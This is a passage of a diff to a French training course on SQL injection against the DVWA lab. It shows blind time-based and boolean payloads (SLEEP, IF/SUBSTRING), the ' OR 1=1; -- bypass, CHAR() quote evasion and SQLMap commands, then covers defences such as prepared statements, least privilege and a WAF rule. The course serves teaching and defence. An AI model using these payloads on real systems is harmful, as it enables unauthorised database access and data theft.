+**Payload de test** :
+```
 1' AND SLEEP(5) --[ESPACE]
 ```
 
-**Comportement** :
-- Si vulnérable → Réponse après **5 secondes**
-- Si non vulnérable → Réponse immédiate
-
-**Extraction de données**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
-
+**Requête SQL** :
 ```sql
--- Test si premier caractère du username est 'a'
+SELECT first_name, last_name FROM users WHERE user_id = '1' AND SLEEP(5) -- '
+```
+
+**Comportement** :
+- Si vulnérable : Réponse après 5 secondes
+- Si non vulnérable : Réponse immédiate
+
+**Extraction de données** :
+
+Pour tester si le premier caractère est 'a' :
+```sql
 1' AND IF(SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) --[ESPACE]
-
--- Si délai de 5 secondes → Premier caractère est 'a'
--- Sinon → Essayer 'b', 'c', etc.
 ```
 
-### 5.5 SQLMap Blind Injection
+**Analyse** :
+- `IF(condition, valeur_si_vrai, valeur_si_faux)`
+- Si le premier caractère est 'a' : `SLEEP(5)` est exécuté → Délai de 5 secondes
+- Sinon : `0` est retourné → Pas de délai
 
-**Sauvegarder requête GET (Blind)** :
+### 5.4 SQLMap pour Blind Injection
 
-```
-1. ZAP → SQL Injection (Blind)
-2. Soumettre : User ID = 1
-3. History → GET request
-4. Save Raw → Request → Headers Only
-5. Enregistrer : ~/Documents/blind_header.raw
-```
-
-**Contenu** :
+**Sauvegarde de la requête** :
 
 ```http
 GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
@@ -756,49 +662,31 @@ Host: servertcm:8001
 Cookie: PHPSESSID=abc123; security=low
 ```
 
-**Lancement SQLMap** :
-
+**Commande SQLMap** :
 ```bash
-sqlmap -r ~/Documents/blind_header.raw --dbms mysql
+sqlmap -r blind_request.raw --dbms mysql
 ```
 
-**Résultat**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
-
+**Résultat** :
 ```
-[07:08:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
-
-[07:08:50] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
 ```
 
-**Explication** :
+**Analyse** :
+- SQLMap détecte automatiquement le type d'injection
+- Il utilise des techniques boolean-based et time-based
+- Il extrait les données sans affichage direct
 
-1. **Boolean-based blind**  : [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
-   - SQLMap teste : `id=1 AND 1=1` → Code 200 (User exists)
-   - SQLMap teste : `id=1 AND 1=2` → Code différent (User MISSING)
-   - → Injection confirmée
+---
 
-2. **Time-based blind**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
-   - SQLMap teste : `id=1 AND SLEEP(5)` → Délai de 5 secondes
-   - → Injection confirmée
+## Partie 6 : Mécanismes de Protection
 
-**Payload Time-based**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
+### 6.1 Prepared Statements (Recommandé)
 
-```sql
-GET parameter 'id':
-Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
-```
+**Principe** : Séparer le code SQL des données utilisateur.
 
-**Avantage** : Fonctionne même si **aucun résultat** n'est affiché.
-
-***
-
-## Partie 6 : Protections contre SQL Injection
-
-### 6.1 Prepared Statements (Recommandé) [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)
-
-**PHP (PDO)**  : [lwn](https://lwn.net/Articles/176749/)
-
+**Implémentation PHP (PDO)** :
 ```php
 <?php
 // Préparer la requête avec placeholders
@@ -812,23 +700,25 @@ $user = $stmt->fetch();
 ?>
 ```
 
-**Avantage**  : [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)
-- ✅ Paramètres traités comme **données**, jamais comme **code SQL**
-- ✅ Protection automatique contre toutes les injections
-- ✅ Portable entre DBMS
+**Avantages** :
+- Les paramètres sont traités comme des données, jamais comme du code SQL
+- Protection automatique contre toutes les injections
+- Portable entre différents SGBD
+- Performance améliorée (réutilisation des requêtes préparées)
 
-**Exemple injection bloquée**  : [lwn](https://lwn.net/Articles/176749/)
-
+**Exemple d'injection bloquée** :
 ```php
 Input: username = admin' OR 1=1; --
-Requête: SELECT * FROM users WHERE username = 'admin\' OR 1=1; -- ' AND password = '...'
+Requête préparée: SELECT * FROM users WHERE username = ? AND password = ?
+Paramètres: ['admin\' OR 1=1; --', '...']
 → Cherche littéralement username "admin' OR 1=1; --" (qui n'existe pas)
 ```
 
 ### 6.2 ORM (Object-Relational Mapping)
 
-**Exemple Doctrine (PHP)** :
+**Principe** : Utiliser une couche d'abstraction qui génère automatiquement des requêtes sécurisées.
 
+**Exemple Doctrine (PHP)** :
 ```php
 $user = $entityManager->getRepository(User::class)->findOneBy([
     'username' => $username,
@@ -837,18 +727,22 @@ $user = $entityManager->getRepository(User::class)->findOneBy([
 ```
 
 **Exemple SQLAlchemy (Python)** :
-
 ```python
 user = session.query(User).filter_by(username=username, password=password).first()
 ```
 
-**Avantage** : ORM génère automatiquement des requêtes préparées.
+**Avantages** :
+- Les ORM génèrent automatiquement des requêtes préparées
+- Abstraction du SQL
+- Protection contre les injections par défaut
 
 ### 6.3 Validation stricte des inputs
 
-**Whitelist** :
+**Principe** : Valider que l'entrée correspond au format attendu.
 
+**Whitelist (approche recommandée)** :
 ```php
+<?php
 // ID doit être numérique
 if (!is_numeric($id)) {
     die("Invalid ID");
@@ -858,50 +752,117 @@ if (!is_numeric($id)) {
 if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
     die("Invalid email");
 }
+
+// Longueur maximale
+if (strlen($username) > 50) {
+    die("Username too long");
+}
+?>
 ```
 
 ### 6.4 Principe du moindre privilège
 
-**MySQL** :
+**Principe** : Le compte de base de données utilisé par l'application doit avoir les permissions minimales nécessaires.
 
+**Mauvaise configuration** :
 ```sql
--- Mauvais : Compte app avec tous les droits
+-- Compte app avec tous les droits
 GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';
+```
 
--- Bon : Compte avec droits minimaux
+**Bonne configuration** :
+```sql
+-- Compte avec droits minimaux
 GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'webapp'@'localhost';
 -- Pas de DROP, DELETE, FILE, etc.
 ```
 
-**Impact** : Même si SQLi réussit, l'attaquant ne peut pas `DROP TABLE` ou lire `/etc/passwd`.
+**Impact** : Même si une injection SQL réussit, l'attaquant ne peut pas supprimer des tables ou lire des fichiers système.
 
 ### 6.5 WAF (Web Application Firewall)
 
-**ModSecurity (Apache)** :
+**Principe** : Filtrer les requêtes malveillantes avant qu'elles n'atteignent l'application.
 
+**Exemple ModSecurity (Apache)** :
 ```apache
 SecRule ARGS "@detectSQLi" \
     "id:1000,phase:2,deny,status:403,msg:'SQL Injection detected'"
 ```
 
-**Cloudflare WAF** : Règles managées anti-SQLi.
+**Avantages** :
+- Protection supplémentaire
+- Détection de patterns connus
+- Centralisation des règles de sécurité
 
-***
+**Limitations** :
+- Peut générer des faux positifs
+- Ne remplace pas le codage sécurisé
+- Les attaquants peuvent contourner les filtres
 
-## Résumé : Points clés à retenir
+---
 
-1. **SQL Injection** : Empoisonnement requêtes DB avec input malveillant [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
-2. **DVWA Low** : `' OR 1=1; --` bypass authentification [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
-3. **Espace après `--`** : OBLIGATOIRE pour commentaire SQL [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
-4. **UNION SELECT** : Extraction de données d'autres tables [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
-5. **ORDER BY** : Déterminer nombre de colonnes [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
-6. **DVWA Medium** : `mysqli_real_escape_string()` échappe quotes [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
-7. **Bypass Medium** : Injection numérique sans quotes `1 UNION SELECT 1,2` [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
-8. **CHAR()** : Contourner quotes `table_schema=CHAR(100,118,119,97)` (dvwa) [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
-9. **SQLMap** : `-r request.raw --dbms mysql --dump --dbs` [github](https://github.com/sqlmapproject/sqlmap/issues/2498)
-10. **UNION query (NULL)** : SQLMap teste `UNION SELECT NULL, NULL, ...` [github](https://github.com/sqlmapproject/sqlmap/issues/2519)
-11. **Blind SQLi** : Boolean-based (vrai/faux) et Time-based (SLEEP) [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
-12. **ORDER BY X** : Incrémenter jusqu'à erreur pour compter colonnes [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
-13. **SLEEP(5)** : Délai de 5s si condition vraie (Time-based) [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
-14. **Protection** : Prepared statements avec placeholders `?` [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)
-15. **Least Privilege** : Compte DB avec droits minimaux (pas DROP, FILE)
+## Partie 7 : Synthèse et Points Clés
+
+### Concepts fondamentaux
+
+1. **Nature de SQLi** : Vulnérabilité d'injection permettant de manipuler des requêtes SQL via des inputs utilisateur non sécurisés.
+
+2. **Mécanisme** : Concaténation directe de l'entrée utilisateur dans la requête SQL sans validation ou échappement.
+
+3. **Typologie** : Trois types principaux basés sur la visibilité des résultats : In-band, Blind, Out-of-band.
+
+### Vecteurs d'exploitation
+
+- **Payload basique** : `' OR 1=1; --`
+- **UNION SELECT** : Extraction de données d'autres tables
+- **ORDER BY** : Détermination du nombre de colonnes
+- **Blind Boolean** : Inférence basée sur vrai/faux
+- **Blind Time** : Inférence basée sur des délais (SLEEP)
+
+### Techniques de contournement
+
+- **Échappement de quotes** : `mysqli_real_escape_string()` contournable avec payloads numériques
+- **Fonctions de conversion** : `CHAR()` pour éviter les quotes
+- **Commentaires SQL** : `--[ESPACE]` pour ignorer le reste de la requête
+
+### Mécanismes de protection
+
+1. **Prepared Statements** : Mesure fondamentale, sépare code et données
+2. **ORM** : Couche d'abstraction sécurisée
+3. **Validation serveur** : Vérification des formats attendus
+4. **Moindre privilège** : Permissions minimales pour le compte DB
+5. **WAF** : Filtrage supplémentaire des requêtes
+
+### Limites des protections
+
+- Les filtres basés sur l'échappement sont contournables
+- Les validations côté client sont aisément contournables
+- Aucune protection unique n'est suffisante
+- La défense en profondeur est nécessaire
+
+---
+
+## Conclusion
+
+Ce cours a présenté les fondements théoriques et pratiques des attaques SQL Injection. La compréhension des différents types d'injection (In-band, Blind) est essentielle pour évaluer leur criticité et choisir les techniques d'exploitation appropriées.
+
+L'automatisation avec SQLMap permet d'accélérer considérablement le processus d'énumération et d'extraction, mais la compréhension manuelle des vecteurs d'attaque reste indispensable pour analyser les vulnérabilités complexes.
+
+La protection efficace repose sur l'utilisation systématique de prepared statements, complétée par une validation rigoureuse des inputs, le principe du moindre privilège, et éventuellement un WAF pour une défense en profondeur.
+
+---
+
+## Glossaire
+
+| Terme | Définition |
+|-------|------------|
+| **SQLi** | SQL Injection : Injection de code SQL dans des requêtes de base de données |
+| **SGBD** | Système de Gestion de Base de Données (ex: MySQL, PostgreSQL) |
+| **Payload** | Code malveillant injecté par l'attaquant |
+| **UNION SELECT** | Opérateur SQL combinant les résultats de deux requêtes |
+| **Blind SQLi** | Injection SQL sans retour direct de résultats |
+| **Prepared Statement** | Requête SQL précompilée avec paramètres sécurisés |
+| **ORM** | Object-Relational Mapping : Couche d'abstraction base de données |
+| **WAF** | Web Application Firewall : Pare-feu applicatif web |
+| **SLEEP()** | Fonction SQL provoquant un délai (utilisé pour Blind Time-based) |
+| **information_schema** | Base de données système MySQL contenant des métadonnées |
